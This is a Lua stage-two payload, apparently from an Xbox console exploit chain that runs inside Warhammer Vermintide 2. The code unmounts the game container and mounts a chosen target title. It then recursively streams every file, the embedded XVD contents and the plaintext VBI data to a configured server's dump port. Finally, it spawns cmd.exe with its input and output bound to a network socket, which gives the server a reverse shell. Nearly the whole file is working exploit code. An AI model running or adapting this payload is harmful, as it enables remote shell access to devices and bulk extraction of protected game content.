local ffi = require("ffi")
local bit = require("bit")

--  EDIT ME
local testWindows = false
local serverIp = "192.168.123.1" -- Change this to your server's IP address
local serverPort = 8124 -- Change this to your server's port
local dumpPort = 8126 -- Port to connect to for game dumping

local kernelDllName = "kernelx"
local cmdExeName = "mwcmd.exe"

-- Path to XVC to mount
local targetXvdPath = "[XUC:]\\eeddfb13-245e-4385-900a-b9abf88f13fe"
-- EDIT END

-- Only if Vermintide 2 is not stored on internal storage, this needs to be edited
-- Prefix of USB Game drive is XE0 / XE1 ..
local vermintide2XvcPath = "[XUC:]\\7c7eb620-5f1a-4dff-8375-1446377cb1e8"

-- Override for local windows testing
if testWindows then
    print("Platform: Windows")
    kernelDllName = "kernel32"
    serverIp = "127.0.0.1"
    cmdExeName = "cmd.exe"

    function OpenTCPConnection(a, b)
    end

    function SocketSend(a, b, c, d)
    end

    function SocketReceive(a, b, c, d)
    end

    function CloseSocket(a)
    end
else
    print("Platform: XBOX")
---@diagnostic disable: undefined-global
    -- standardize method names
    if openTcpConnection ~= nil then
      OpenTCPConnection = openTcpConnection
      SocketSend = socketSend
      SocketReceive = socketReceive
      CloseSocket = closeSocket
---@diagnostic enable: undefined-global
    end
end

-- Open our main (info) socket
local socket = OpenTCPConnection(serverIp, serverPort)

local MemoryBuffer = {
  size = 0,
  actualSize = nil,
  buffer = nil,
}

function MemoryBuffer.create(size)
  local self = {
      buffer =  ffi.new("char[?]", size),
      size = size,
      actualSize = nil,
  }
  return self
end

local fileBuf = MemoryBuffer.create(0x1000000) -- 16MB

local makeCString = function(lua_str)
  local len = #lua_str
  local buf = ffi.new("char[?]", len + 1)
  ffi.copy(buf, lua_str, len)
  buf[len] = 0
  return buf
end

local sendLog = function(lua_str)
  -- print(lua_str)
  SocketSend(socket, makeCString(lua_str.."\r\n"), #lua_str + 2, 0)
end

sendLog("Stage 2 -- Initialization")

sendLog("Stage 2 -- Loading C Definitions")

ffi.cdef[[
    typedef char CHAR;
    typedef int INT;
    typedef short SHORT;
    typedef unsigned short WORD;
    typedef unsigned int DWORD;
    typedef unsigned long* ULONG_PTR;
    typedef void* PVOID;

    typedef unsigned char* LPBYTE;
    typedef void* LPVOID;
    typedef unsigned int* LPDWORD;
    typedef char* LPSTR;
    typedef char* LPCSTR;
    typedef wchar_t WCHAR;
    typedef void *HANDLE;
    typedef wchar_t* LPCWSTR;
    typedef wchar_t* LPWSTR;
    typedef unsigned char BOOL;

    typedef struct _FILETIME {
        DWORD dwLowDateTime;
        DWORD dwHighDateTime;
    } FILETIME;

    typedef struct _OVERLAPPED {
        ULONG_PTR Internal;
        ULONG_PTR InternalHigh;
        union {
          struct {
            DWORD Offset;
            DWORD OffsetHigh;
          } DUMMYSTRUCTNAME;
          PVOID Pointer;
        } DUMMYUNIONNAME;
        HANDLE    hEvent;
      } OVERLAPPED, *LPOVERLAPPED;

    typedef struct _SECURITY_ATTRIBUTES {
        DWORD  nLength;
        LPVOID lpSecurityDescriptor;
        BOOL   bInheritHandle;
      } SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;

    typedef struct _WIN32_FIND_DATAA {
        DWORD dwFileAttributes;
        FILETIME ftCreationTime;
        FILETIME ftLastAccessTime;
        FILETIME ftLastWriteTime;
        DWORD nFileSizeHigh;
        DWORD nFileSizeLow;
        DWORD dwReserved0;
        DWORD dwReserved1;
        CHAR cFileName[255];
        CHAR cAlternateFilename[14];
        DWORD dwFileType;
        DWORD dwCreatorType;
        WORD wFinderFlag;
    } WIN32_FIND_DATAA;

    HANDLE FindFirstFileA(
        LPCSTR lpDirectoryName,
        WIN32_FIND_DATAA *lpFindFileData);

    BOOL FindNextFileA(
        HANDLE hFindFile,
        WIN32_FIND_DATAA *lpFindFileData);

    BOOL FindClose(HANDLE hFindFile);

    HANDLE CreateFileA(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
      );

      BOOL CloseHandle(
        HANDLE hObject
    );

	BOOL ReadFile(
		HANDLE       hFile,
		LPVOID       lpBuffer,
		DWORD        nNumberOfBytesToRead,
		LPDWORD      lpNumberOfBytesRead,
		LPOVERLAPPED lpOverlapped
	);

	DWORD GetLastError();
]]

ffi.cdef[[
        typedef struct _STARTUPINFOA {
            DWORD  cb;
            LPSTR  lpReserved;
            LPSTR  lpDesktop;
            LPSTR  lpTitle;
            DWORD  dwX;
            DWORD  dwY;
            DWORD  dwXSize;
            DWORD  dwYSize;
            DWORD  dwXCountChars;
            DWORD  dwYCountChars;
            DWORD  dwFillAttribute;
            DWORD  dwFlags;
            WORD   wShowWindow;
            WORD   cbReserved2;
            LPBYTE lpReserved2;
            HANDLE hStdInput;
            HANDLE hStdOutput;
            HANDLE hStdError;
        } STARTUPINFOA, *LPSTARTUPINFOA;

        typedef struct _STARTUPINFOW {
          DWORD  cb;
          LPWSTR  lpReserved;
          LPWSTR  lpDesktop;
          LPWSTR  lpTitle;
          DWORD  dwX;
          DWORD  dwY;
          DWORD  dwXSize;
          DWORD  dwYSize;
          DWORD  dwXCountChars;
          DWORD  dwYCountChars;
          DWORD  dwFillAttribute;
          DWORD  dwFlags;
          WORD   wShowWindow;
          WORD   cbReserved2;
          LPBYTE lpReserved2;
          HANDLE hStdInput;
          HANDLE hStdOutput;
          HANDLE hStdError;
      } STARTUPINFOW, *LPSTARTUPINFOW;

        typedef struct _PROCESS_INFORMATION {
            HANDLE hProcess;
            HANDLE hThread;
            LPVOID lpBaseAddress;
            DWORD dwDesiredAccess;
        } PROCESS_INFORMATION, *LPPROCESS_INFORMATION;

        int CreateProcessA(
            LPCSTR lpApplicationName,
            LPCSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCSTR lpCurrentDirectory,
            LPSTARTUPINFOA lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );

        int CreateProcessW(
            LPCWSTR lpApplicationName,
            LPWSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes,
            LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles,
            DWORD dwCreationFlags,
            LPVOID lpEnvironment,
            LPCWSTR lpCurrentDirectory,
            LPSTARTUPINFOW lpStartupInfo,
            LPPROCESS_INFORMATION lpProcessInformation
        );

        DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
]]

ffi.cdef[[
  typedef unsigned int HRESULT;
  typedef unsigned int UINT;
  typedef unsigned long long UINT64;

  HRESULT XCrdOpenAdapter(HANDLE* phAdapter);
  HRESULT XCrdCloseAdapter(HANDLE hAdapter);
  HRESULT XCrdMount(HANDLE* phDevice, HANDLE hAdapter, LPCWSTR CrdPath, UINT Flags);
  HRESULT XCrdMountContentType(HANDLE* phDevice, HANDLE hAdapter, LPCWSTR CrdPath, UINT ContentType, UINT Flags);
  HRESULT XCrdUnmount(HANDLE hAdapter, HANDLE hDevice);
  HRESULT XCrdUnmountByPath(HANDLE hAdapter, LPCWSTR CrdPath);
  HRESULT XCrdQueryDevicePath(LPCWSTR* ppDevicePath, HANDLE hDevice);
  HRESULT XCrdReadUserDataXVD(HANDLE hAdapter, LPCWSTR CrdPath, UINT64 Offset, PVOID Buffer, UINT64* BufferLength);
]]

ffi.cdef[[
  typedef bool* LPBOOL;
  typedef const char* LPCCH;

  int MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPCWSTR lpWideCharStr, int cchWideChar);
  int WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPCCH lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
]]

sendLog("Stage 2 -- Loading KernelX")
local kernelx = ffi.load(kernelDllName)

sendLog("Stage 2 -- Loading XCrdApi")
local xcrd = ffi.load("xcrdapi")

sendLog("Stage 2 -- Defining local functions")

local sendError = function(val)
    sendLog("ERROR:" .. val)
end

local toHexError = function(errorCode)
  return string.format("0x%x", errorCode)
end

local makeWideCString = function(val)
  local codepage = 65001

  if type(val) ~= 'string' then
    return nil, 0
   end

   local luaStringSize = #val + 1
   local stringSize = kernelx.MultiByteToWideChar(codepage, 0, val, luaStringSize, nil, 0)
   local stringBuffer = ffi.new("WCHAR[?]", stringSize)
   local result = kernelx.MultiByteToWideChar(codepage, 0, val, stringSize, stringBuffer, stringSize)
   if result == 0 then
      local error = kernelx.GetLastError()
      sendError("Got error while converting lua->wstring string.")
      sendError(tostring(error))
      return nil, error
   end

   return stringBuffer, stringSize
end

local makeWideLuaString = function(val)
  local codepage = 65001

  local stringLength = kernelx.WideCharToMultiByte(codepage, 0, val, -1, nil, 0, nil, nil)
  local stringBuffer = ffi.new("CHAR[?]", stringLength)
  local result = kernelx.WideCharToMultiByte(codepage, 0, val, -1, stringBuffer, stringLength, nil, nil)
  if result == 0 then
    local error = kernelx.GetLastError()
    sendError("Got error while converting wstring->lua string.")
    sendError(tostring(error))
    return nil, result
  end

  return ffi.string(stringBuffer, stringLength - 1), 0
end

-- Credits to iryont (https://github.com/iryont/lua-struct)
local struct = {}
function struct.pack(format, ...)
  local stream = {}
  local vars = {...}
  local endianness = true

  for i = 1, format:len() do
    local opt = format:sub(i, i)

    if opt == '<' then
      endianness = true
    elseif opt == '>' then
      endianness = false
    elseif opt:find('[bBhHiIlL]') then
      local n = opt:find('[hH]') and 2 or opt:find('[iI]') and 4 or opt:find('[lL]') and 8 or 1
      local val = tonumber(table.remove(vars, 1))

      local bytes = {}
      for j = 1, n do
        table.insert(bytes, string.char(val % (2 ^ 8)))
        val = math.floor(val / (2 ^ 8))
      end

      if not endianness then
        table.insert(stream, string.reverse(table.concat(bytes)))
      else
        table.insert(stream, table.concat(bytes))
      end
    elseif opt:find('[fd]') then
      local val = tonumber(table.remove(vars, 1))
      local sign = 0

      if val < 0 then
        sign = 1
        val = -val
      end

      if val == nil then
        val = 0
      end

      local mantissa, exponent = math.frexp(val)
      if val == 0 then
        mantissa = 0
        exponent = 0
      else
        mantissa = (mantissa * 2 - 1) * math.ldexp(0.5, (opt == 'd') and 53 or 24)
        exponent = exponent + ((opt == 'd') and 1022 or 126)
      end

      local bytes = {}
      if opt == 'd' then
        val = mantissa
        for i = 1, 6 do
          table.insert(bytes, string.char(math.floor(val) % (2 ^ 8)))
          val = math.floor(val / (2 ^ 8))
        end
      else
        table.insert(bytes, string.char(math.floor(mantissa) % (2 ^ 8)))
        val = math.floor(mantissa / (2 ^ 8))
        table.insert(bytes, string.char(math.floor(val) % (2 ^ 8)))
        val = math.floor(val / (2 ^ 8))
      end

      table.insert(bytes, string.char(math.floor(exponent * ((opt == 'd') and 16 or 128) + val) % (2 ^ 8)))
      val = math.floor((exponent * ((opt == 'd') and 16 or 128) + val) / (2 ^ 8))
      table.insert(bytes, string.char(math.floor(sign * 128 + val) % (2 ^ 8)))
      val = math.floor((sign * 128 + val) / (2 ^ 8))

      if not endianness then
        table.insert(stream, string.reverse(table.concat(bytes)))
      else
        table.insert(stream, table.concat(bytes))
      end
    elseif opt == 's' then
      table.insert(stream, tostring(table.remove(vars, 1)))
      table.insert(stream, string.char(0))
    elseif opt == 'c' then
      local n = format:sub(i + 1):match('%d+')
      local str = tostring(table.remove(vars, 1))
      local len = tonumber(n)
      if len <= 0 then
        len = str:len()
      end
      if len - str:len() > 0 then
        str = str .. string.rep(' ', len - str:len())
      end
      table.insert(stream, str:sub(1, len))
      i = i + n:len()
    end
  end

  return table.concat(stream)
end

INFO_TRANSFER_START = 1
INFO_TRANSFER_END = 2
INFO_TRANSFER_READ_FAILED = 4

local sendFileInfo = function(sock, attributes, lastWriteTimeLow, lastWriteTimeHigh, fileSizeLow, fileSizeHigh, filePath, flags)
    local flagsValue = bit.bor(attributes, bit.lshift(flags, 18))
    local dataStruct = struct.pack("<IIIIII", flagsValue, lastWriteTimeLow, lastWriteTimeHigh, fileSizeLow, fileSizeHigh, #filePath)
    SocketSend(sock, makeCString(dataStruct), #dataStruct, 0)
    if #filePath > 0 then
        SocketSend(sock, filePath, #filePath, 0)
    end
end

local sendBeginTransfer = function(sock)
    sendFileInfo(sock, 0, 0, 0, 0, 0, "", INFO_TRANSFER_START)
end

local sendEndTransfer = function(sock)
    sendFileInfo(sock, 0, 0, 0, 0, 0, "", INFO_TRANSFER_END)
end

local sendFile = function(sock, fullPath, fileData, fileSize)
    print("Uploading " .. fullPath)
    sendFileInfo(sock, 0x80, 0, 0, fileSize, 0, fullPath, 0)
    SocketSend(sock, fileData, fileSize, 0)
end

-- Thx to Emma / @InvoxiPlayGames
-- Reference: https://github.com/InvoxiPlayGames/OneDumpgame
local uploadFilesRecursively
uploadFilesRecursively = function(sock, dirname)
  local finddata = ffi.new("WIN32_FIND_DATAA")
  local findHandle = kernelx.FindFirstFileA(makeCString(dirname .. "\\*"), finddata);

  local currentlyReadBytesPtr = ffi.new("DWORD[1]")

  local sendInfo = function(data, filename, flags)
    sendFileInfo(sock,
      data.dwFileAttributes,
      data.ftLastWriteTime.dwLowDateTime,
      data.ftLastWriteTime.dwHighDateTime,
      data.nFileSizeLow,
      data.nFileSizeHigh,
      filename,
      flags)
  end

  while(true)
  do
    local fileName = ffi.string(finddata.cFileName)
    local fullName = dirname .. "\\" .. fileName

    print("Handling " .. fullName)

    if bit.band(finddata.dwFileAttributes, 0x10) == 0x10 and fileName ~= "." and fileName ~= ".." then
      uploadFilesRecursively(sock, fullName)
    elseif fileName ~= "." and fileName ~= ".." then
      local fileHandle = kernelx.CreateFileA(makeCString(fullName), 0x80000000, 0x7, nil, 3, 0, nil)
      if fileHandle == ffi.cast("HANDLE", -1) then
        sendLog("Transfer of file \"" .. fullName .. "\" failed: Failed to open file")
        sendInfo(finddata, fullName, INFO_TRANSFER_READ_FAILED)
      else
        local remaining = 0
        local readFailed = false
        local infoSent = false

        if finddata.nFileSizeHigh ~= 0 then
          local readParts = 0

          while (finddata.nFileSizeHigh > readParts)
          do
            remaining = 0x100000000

            while (remaining ~= 0)
            do
              local currentReadCount = math.min(remaining, 0x1000000)

              local readResult = kernelx.ReadFile(fileHandle, fileBuf.buffer, currentReadCount, currentlyReadBytesPtr, nil)
              if not readResult then
                sendLog("Transfer of file \"" .. fullName .. "\" failed: Failed to read file")
                sendInfo(finddata, fullName, INFO_TRANSFER_READ_FAILED)
                readFailed = true
                break
              end

              if not infoSent then
                sendInfo(finddata, fullName, 0)
                infoSent = true
              end

              local actuallyReadBytes = currentlyReadBytesPtr[0]
              SocketSend(sock, fileBuf.buffer, actuallyReadBytes, 0)
              remaining = remaining - actuallyReadBytes
            end

            if readFailed then
              break
            end

            readParts = readParts + 1
          end
        end

        if not readFailed then
          remaining = finddata.nFileSizeLow
          while (remaining ~= 0)
          do
            local currentReadCount = math.min(remaining, 0x1000000)

            local readResult = kernelx.ReadFile(fileHandle, fileBuf.buffer, currentReadCount, currentlyReadBytesPtr, nil)
            if not readResult then
              sendLog("Transfer of file \"" .. fullName .. "\" failed: Failed to read file")
              sendInfo(finddata, fullName, INFO_TRANSFER_READ_FAILED)
              readFailed = true
              break
            end

            if not infoSent then
              sendInfo(finddata, fullName, 0)
              infoSent = true
            end

            local actuallyReadBytes = currentlyReadBytesPtr[0]
            SocketSend(sock, fileBuf.buffer, actuallyReadBytes, 0)
            remaining = remaining - actuallyReadBytes
          end
        end

        kernelx.CloseHandle(fileHandle)
      end
    end

    if kernelx.FindNextFileA(findHandle, finddata) == 0 then
      kernelx.CloseHandle(findHandle)
      break
    end
  end
end

local xcrdInit = function()
  local adapterPtr = ffi.new("HANDLE[1]")
  local result = xcrd.XCrdOpenAdapter(adapterPtr)
  local adapter = adapterPtr[0]
  if result ~= 0 then
    sendError("XCrdOpenAdapter failed with error" .. toHexError(result) .. ", returned handle: " .. tostring(adapter))
    return nil, result
  end

  sendLog("XCrdOpenAdapter succeeded")

  return adapter, 0
end

local hasUnmountedGame = false
local xcrdMountXvd = function(adapter, xvdPath)
  sendLog("XCrdMountXVD(\"" .. xvdPath .. "\"): begin")

  local result = 0

  if not hasUnmountedGame then
    sendLog("Unmounting currently active Warhammer Vermintide 2 XVC")
    local v2PathWide = nil
    -- Unmount Warhammer Vermintide2 XVC, so we can mount our target XVC :)
    v2PathWide, result = makeWideCString(vermintide2XvcPath)
    if v2PathWide == nil then
      sendError("XVC V2 path conversion failed with error " .. toHexError(result))
      return nil, nil, 0
    end

    sendLog("XVC V2 path conversion succeeded")

    result = xcrd.XCrdUnmountByPath(adapter, v2PathWide)
    if result ~= 0 then
      sendError("XVC V2 XCrdUnmountByPath failed with error " .. toHexError(result) .. ", did you set 'vermintide2XvcPath' correctly in stage2.lua?")
      return nil, nil, result
    end

    sendLog("XVC V2 unmount succeeded")
    hasUnmountedGame = true
  end

  local xvdPathWide = nil
  xvdPathWide, result = makeWideCString(xvdPath)
  if xvdPathWide == nil then
    sendError("XVD path conversion failed with error " .. toHexError(result))
    return nil, nil, 0
  end

  sendLog("XVD path conversion succeeded")

  local devicePtr = ffi.new("HANDLE[1]")
  result = xcrd.XCrdMount(devicePtr, adapter, xvdPathWide, 0)
  local device = devicePtr[0]
  if result ~= 0 then
    sendError("XCrdMount failed with error " .. toHexError(result) .. ", returned handle: " .. tostring(device))
    return nil, nil, result
  end

  sendLog("XCrdMount succeeded")

  local devicePathPtr = ffi.new("LPCWSTR[1]")
  result = xcrd.XCrdQueryDevicePath(devicePathPtr, device)
  local devicePathWide = devicePathPtr[0]
  if result ~= 0 then
    sendError("XCrdQueryDevicePath failed with error " .. toHexError(result) .. ", returned ptr: " .. tostring(devicePathWide))
    return nil, nil, result
  end

  sendLog("XCrdQueryDevicePath succeeded")

  local devicePath = nil
  devicePath, result = makeWideLuaString(devicePathWide)
  if devicePath == nil then
    sendError("XVD device path conversion failed with error " .. toHexError(result))
    return nil, nil, 0
  end

  sendLog("XVD device path conversion succeeded")

  return tostring(devicePath), device, 0
end

local xcrdClose = function(adapter)
  xcrd.XCrdCloseAdapter(adapter)
end

local xcrdUnmount = function(adapter, device)
  xcrd.XCrdUnmount(adapter, device)
end

local xcrdReadUserData = function(adapter, xvdPath)
  local result = 0

  local xvdPathWide = nil
  xvdPathWide, result = makeWideCString(xvdPath)
  if xvdPathWide == nil then
    sendError("XVD path conversion failed with error " .. toHexError(result))
    return nil, 0, 0
  end

  local userDataSizePtr = ffi.new("UINT64[1]")

  result = xcrd.XCrdReadUserDataXVD(adapter, xvdPathWide, 0, nil, userDataSizePtr)
  if result ~= 0x8007007A then
    sendError("XCrdReadUserDataXVD with null buffer failed with error " .. toHexError(result))
    return nil, 0, result
  end

  local userDataSize = userDataSizePtr[0]

  local buffer = ffi.new("char[?]", userDataSize)
  result = xcrd.XCrdReadUserDataXVD(adapter, xvdPathWide, 0, buffer, userDataSizePtr)
  if result ~= 0 then
    sendError("XCrdReadUserDataXVD failed with error " .. toHexError(result))
    return nil, 0, result
  end

  sendLog("XCrdReadUserDataXVD succeeded")

  return buffer, userDataSize, 0
end

local spawnReverseShell = function()
  local procInfo = ffi.new("PROCESS_INFORMATION")
  local startInfo = ffi.new("STARTUPINFOW")
  startInfo.cb = ffi.sizeof(startInfo)
  startInfo.dwFlags = 0x100 -- STARTF_USESTDHANDLES
  local sockHandle = ffi.cast("HANDLE", socket)
  startInfo.hStdInput = sockHandle
  startInfo.hStdError = sockHandle
  startInfo.hStdOutput = sockHandle
  kernelx.CreateProcessW(
    nil,
    makeWideCString(cmdExeName),
    nil,
    nil,
    1,
    0,
    nil,
    makeWideCString("C:\\Windows\\System32\\"),
    startInfo,
    procInfo
  )

  while(true)
  do
      print("This loop will run forever.")
  end
end

local runShellCommand = function(command)
  local procInfo = ffi.new("PROCESS_INFORMATION")
  local startInfo = ffi.new("STARTUPINFOW")
  startInfo.cb = ffi.sizeof(startInfo)
  kernelx.CreateProcessW(
    nil,
    makeWideCString(cmdExeName .. " /C " .. command),
    nil,
    nil,
    0,
    0,
    nil,
    makeWideCString("C:\\Windows\\System32\\"),
    startInfo,
    procInfo
  )

  kernelx.WaitForSingleObject(procInfo.hProcess, 0xFFFFFFFF)
  kernelx.CloseHandle(procInfo.hThread)
  kernelx.CloseHandle(procInfo.hProcess)
end

function Stage2Main(args)
  sendLog("Stage 2 -- Running main")

  local adapter = xcrdInit()

  -- Mount Game XVC
  sendLog("Mounting game XVC")
  local mountPath, gameHandle, result = xcrdMountXvd(adapter, targetXvdPath)
  if mountPath == nil then
    sendError("Mounting XVD (" .. targetXvdPath .. ") failed with error " .. toHexError(result))
  else
    sendLog("Successfully mounted XVD (" .. targetXvdPath .. "). Device path: " .. mountPath)

    runShellCommand("rmdir T:\\Mount")
    runShellCommand("mklink /J T:\\Mount " .. mountPath .. "\\")

    sendLog("Created junction at T:\\Mount.")

    -- Open dumping connection
    sendLog("Opening connection to " .. serverIp .. ":" .. tostring(dumpPort))
    local dumpSocket = OpenTCPConnection(serverIp, dumpPort)

    -- Initiate dump transfer
    sendBeginTransfer(dumpSocket)

    -- Dump game files
    sendLog("Dumping game...")
    uploadFilesRecursively(dumpSocket, "T:\\Mount")

    -- Mount embedded XVD
    local exvdPath = "[XVE:]\\" .. targetXvdPath

    sendLog("Attempting to mount embedded XVD")
    local exvdMountPath, exvdHandle
    exvdMountPath, exvdHandle, result = xcrdMountXvd(adapter, exvdPath)
    if exvdMountPath == nil then
      sendError("Mounting embedded XVD failed with error " .. toHexError(result))
    else
      runShellCommand("rmdir T:\\EmbeddedXvd")
      runShellCommand("mklink /J T:\\EmbeddedXvd " .. exvdMountPath .. "\\")
      sendLog("Created junction at T:\\EmbeddedXvd.")

      -- Dump embedded contents
      sendLog("Dumping embedded xvd contents...")
      uploadFilesRecursively(dumpSocket, "T:\\EmbeddedXvd")
      runShellCommand("rmdir T:\\EmbeddedXvd")

      -- Dump plaintext VBI
      sendLog("Attempting to read XVD user data (VBI)")
      local embeddedUserData, embeddedUserDataSize
      embeddedUserData, embeddedUserDataSize, result = xcrdReadUserData(adapter, exvdPath)
      if embeddedUserData == nil then
        sendError("Extracting embedded XVD user data failed with error " .. toHexError(result))
      else
        -- T:\\era.vbi is a pseudo path, VBI is held in memory, not on disk
        sendLog("Dumping VBI...")
        sendFile(dumpSocket, "T:\\era.vbi", embeddedUserData, embeddedUserDataSize)
      end

      -- Unmount embedded xvd
      xcrdUnmount(adapter, exvdHandle)
    end
    -- Remove junction pointing to mounted game
    runShellCommand("rmdir T:\\Mount")
    -- Unmount game
    xcrdUnmount(adapter, gameHandle)

    -- End dump transfer
    sendEndTransfer(dumpSocket)

    -- Close dump socket
    CloseSocket(dumpSocket)
  end
  xcrdClose(adapter)
  spawnReverseShell()
end

-- begin actual stage 2 code
xpcall(Stage2Main,
function(err)
  sendError(tostring(err))
end, "")

sendLog("Stage 2 -- Closing connection")
CloseSocket(socket)